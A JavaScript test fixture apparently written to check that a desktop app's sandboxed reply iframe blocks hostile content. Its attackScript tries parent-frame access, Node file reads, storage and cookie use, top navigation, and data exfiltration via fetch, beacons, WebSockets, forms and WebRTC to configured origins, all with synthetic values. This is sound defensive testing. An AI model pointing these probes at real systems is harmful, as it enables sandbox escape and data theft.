'use strict';

/* Authorized hostile documents for the real production iframe. These are DATA,
 * not a second renderer or sandbox. Never install test webRequest handlers,
 * permission handlers or a stronger CSP around the production implementation.
 */
function interactionScript() {
  document.querySelector('#ready-filter').addEventListener('click', () => {
    document.querySelector('#all-filter').setAttribute('aria-pressed', 'false');
    document.querySelector('#ready-filter').setAttribute('aria-pressed', 'true');
    for (const item of document.querySelectorAll('[data-status]')) item.hidden = item.dataset.status !== 'ready';
    document.querySelector('#status').textContent = '2 ready / 两项就绪';
  });
  document.querySelector('#all-filter').addEventListener('click', () => {
    document.querySelector('#all-filter').setAttribute('aria-pressed', 'true');
    document.querySelector('#ready-filter').setAttribute('aria-pressed', 'false');
    for (const item of document.querySelectorAll('[data-status]')) item.hidden = false;
    document.querySelector('#status').textContent = '3 items / 三项';
  });
  document.querySelector('#expand').addEventListener('click', () => {
    document.querySelector('#extra').hidden = !document.querySelector('#extra').hidden;
    document.querySelector('#expand').setAttribute('aria-expanded', String(!document.querySelector('#extra').hidden));
  });
  document.documentElement.dataset.visualRepliesInteractive = 'ready';
}
function benignHtml() {
  return `<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>Offline interactive reply</title>
<style>
:root{color-scheme:light dark}*{box-sizing:border-box}body{margin:0;padding:16px;font:14px/1.45 var(--font-sans,system-ui);color:var(--ds-text-primary,CanvasText);background:var(--ds-bg-primary,Canvas)}
h2{font-size:16px;margin:0 0 12px}button{font:inherit;padding:6px 12px;border:1px solid var(--ds-border-default,GrayText);border-radius:8px;color:inherit;background:var(--ds-tile,ButtonFace);cursor:pointer}button:focus-visible{outline:2px solid var(--ds-focus,Highlight);outline-offset:2px}button[aria-pressed=true]{font-weight:600}.filters{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}ul{margin:8px 0;padding-inline-start:22px}li{overflow-wrap:anywhere}svg{vertical-align:middle;color:var(--ds-success,CanvasText)}#scroll-list{height:110px;overflow:auto;border-block:1px solid var(--ds-border-default,GrayText);padding-block:8px}#extra{padding-top:12px}
</style></head><body><h2><svg id="fixture-svg" role="img" aria-label="Fixture status" viewBox="0 0 24 24" width="20" height="20"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.6"/><path d="m8 12 3 3 5-6" fill="none" stroke="currentColor" stroke-width="1.6"/></svg> Interactive reply / 交互回复</h2>
<div class="filters"><button id="all-filter" aria-pressed="true">All / 全部</button><button id="ready-filter" aria-pressed="false">Ready / 就绪</button><button id="expand" aria-expanded="false">Details / 展开长内容</button></div>
<p id="status" role="status">3 items / 三项</p><ul id="items"><li data-status="ready">Alpha / 第一项就绪</li><li data-status="waiting">Long English and 中文标签 — waiting item should disappear only after the filter is clicked</li><li data-status="ready">Beta / 第二项就绪</li></ul>
<div id="scroll-list" tabindex="0" aria-label="Local scrolling">${Array.from({ length: 24 }, (_, index) => `<p>Local row ${index + 1} / 内容在回复内滚动</p>`).join('')}</div>
<section id="extra" hidden>${Array.from({ length: 16 }, (_, index) => `<p>Expanded detail ${index + 1} / 高度改变不得影响其他会话</p>`).join('')}</section>
<script>(${interactionScript.toString()})()</script></body></html>`;
}

async function attackScript(config) {
  const results = {}, pending = [];
  const record = (key, fn) => {
    try { const value = fn(); results[key] = value === undefined ? 'allowed' : value; }
    catch (error) { results[key] = error?.name === 'SecurityError' ? 'SecurityError' : 'rejected'; }
  };
  const attempt = (key, fn) => {
    try { pending.push(Promise.resolve(fn()).then(() => { results[key] = 'resolved'; }, () => { results[key] = 'rejected'; })); }
    catch { results[key] = 'rejected'; }
  };
  const node = (tag, properties = {}) => { const element = document.createElement(tag); Object.assign(element, properties); document.body.append(element); return element; };
  record('scriptExecuted', () => true);
  record('parentDom', () => Boolean(parent.document.body));
  record('topDom', () => Boolean(top.document.body));
  record('parentPreload', () => typeof parent.piGuiDesktop);
  record('ownPreload', () => typeof window.piGuiDesktop);
  record('ownRequire', () => typeof require);
  record('ownProcess', () => typeof process);
  record('ownBuffer', () => typeof Buffer);
  record('ownIpc', () => typeof ipcRenderer);
  record('fsRead', () => { if (typeof require !== 'function') return 'unavailable'; require('node:fs').readFileSync(config.fixtureFile); return 'read'; });
  record('parentStorage', () => parent.localStorage.getItem('visual-replies-test-canary'));
  record('localStorage', () => { localStorage.setItem('vr-probe', 'synthetic'); return localStorage.getItem('vr-probe'); });
  record('sessionStorage', () => { sessionStorage.setItem('vr-probe', 'synthetic'); return sessionStorage.getItem('vr-probe'); });
  record('cookie', () => { document.cookie = 'vr-probe=synthetic'; return document.cookie; });
  attempt('indexedDB', () => new Promise((resolve, reject) => { const request = indexedDB.open('vr-probe'); request.onsuccess = () => { request.result.close(); resolve(); }; request.onerror = () => reject(); }));
  attempt('cacheStorage', () => caches.open('vr-probe'));
  attempt('serviceWorker', () => navigator.serviceWorker.register(config.http + '/service-worker'));
  record('opener', () => opener === null);
  record('popup', () => window.open('about:blank', '_blank') === null);
  record('topNavigation', () => { top.location.href = 'about:blank#visual-replies-escape'; return 'assigned'; });
  for (const [name, origin] of Object.entries(config.origins)) {
    attempt('fetch-' + name, () => fetch(origin + '/fetch', { method: 'POST', body: 'synthetic-exfiltration', credentials: 'include' }));
    record('beacon-' + name, () => navigator.sendBeacon(origin + '/beacon', 'synthetic-beacon'));
    attempt('xhr-' + name, () => new Promise((resolve, reject) => { const xhr = new XMLHttpRequest(); xhr.open('GET', origin + '/xhr'); xhr.timeout = 1000; xhr.onload = resolve; xhr.onerror = reject; xhr.ontimeout = reject; xhr.send(); }));
    attempt('websocket-' + name, () => new Promise((resolve, reject) => { const socket = new WebSocket(origin.replace(/^http/, 'ws') + '/websocket'); socket.onopen = () => { socket.close(); resolve(); }; socket.onerror = reject; setTimeout(() => { socket.close(); reject(); }, 1000); }));
    attempt('eventSource-' + name, () => new Promise((resolve, reject) => { const stream = new EventSource(origin + '/event-source'); stream.onopen = () => { stream.close(); resolve(); }; stream.onerror = () => { stream.close(); reject(); }; setTimeout(() => { stream.close(); reject(); }, 1000); }));
    node('img', { src: origin + '/image', alt: 'blocked' });
    node('script', { src: origin + '/script' });
    node('link', { rel: 'stylesheet', href: origin + '/stylesheet' });
    node('iframe', { src: origin + '/nested-frame', title: 'blocked network frame' });
    node('video', { src: origin + '/media', preload: 'auto' });
    const style = node('style'); style.textContent = `@import url("${origin}/css-import");body{background-image:url("${origin}/css-image")}`;
  }
  attempt('fileFetch', () => fetch(config.fixtureFileUrl));
  attempt('appApi', () => fetch(config.appOrigin + '/api/status').then(response => { results.appApiReadable = response.ok; results.appApiStatus = response.status; }));
  record('form', () => { const form = node('form', { method: 'POST', action: config.http + '/form' }); form.append(node('input', { name: 'canary', value: 'synthetic-form' })); form.submit(); });
  record('worker', () => { const worker = new Worker(URL.createObjectURL(new Blob(['postMessage("synthetic")'], { type: 'text/javascript' }))); worker.terminate(); });
  record('sharedWorker', () => { const worker = new SharedWorker(URL.createObjectURL(new Blob(['onconnect=()=>{}'], { type: 'text/javascript' }))); worker.port.close(); });
  // CSP connect-src alone does NOT prohibit STUN/TURN. Real local UDP and TCP
  // sinks count actual arrivals; constructors/offer/candidates are also observed.
  for (const [kind, url] of [['stun', config.stun], ['turn', config.turn]]) {
    attempt('webrtc-' + kind, async () => {
      if (typeof RTCPeerConnection !== 'function') { results['webrtc-api-' + kind] = 'unavailable'; throw Error('unavailable'); }
      const peer = new RTCPeerConnection({ iceServers: [{ urls: url, ...(kind === 'turn' ? { username: 'synthetic', credential: 'synthetic' } : {}) }] });
      results['webrtc-api-' + kind] = 'available'; let candidates = 0;
      peer.onicecandidate = event => { if (event.candidate) candidates++; };
      try { peer.createDataChannel('synthetic'); await peer.setLocalDescription(await peer.createOffer()); await new Promise(resolve => setTimeout(resolve, 1600)); }
      finally { results['webrtc-candidates-' + kind] = candidates; peer.close(); }
    });
  }
  await Promise.race([Promise.allSettled(pending), new Promise(resolve => setTimeout(resolve, 2600))]);
  node('pre', { id: 'vr-probe-result', textContent: JSON.stringify(results) });
  document.documentElement.dataset.visualRepliesAttack = 'completed';
}
function hostileHtml(config) {
  for (const key of ['http', 'stun', 'turn', 'fixtureFile', 'fixtureFileUrl', 'appOrigin']) if (typeof config[key] !== 'string') throw Error('invalid_attack_fixture');
  if (!config.origins || typeof config.origins !== 'object') throw Error('invalid_attack_origins');
  // JSON cannot terminate the element, even when a TEMP path contains '<'.
  const serialized = JSON.stringify(config).replace(/</g, '\\u003c');
  return '<!doctype html><html><head><meta charset="utf-8"><title>Hostile offline reply</title></head><body><h2>Local security probe</h2><script>(' + attackScript.toString() + ')(' + serialized + ')</script></body></html>';
}
function validatePayloadScripts() {
  const vm = require('node:vm');
  new vm.Script('(' + interactionScript.toString() + ')');
  new vm.Script('(' + attackScript.toString() + ')');
  const html = hostileHtml({ http: 'http://127.0.0.1:12345', stun: 'stun:127.0.0.1:12346', turn: 'turn:127.0.0.1:12347?transport=tcp',
    origins: { loopback: 'http://127.0.0.1:12345' }, fixtureFile: 'C:\\Temp\\synthetic<file', fixtureFileUrl: 'file:///C:/Temp/synthetic', appOrigin: 'http://127.0.0.1:12348' });
  new vm.Script(html.match(/<script>([\s\S]*)<\/script>/)[1]);
  return 3;
}
module.exports = { benignHtml, hostileHtml, validatePayloadScripts };
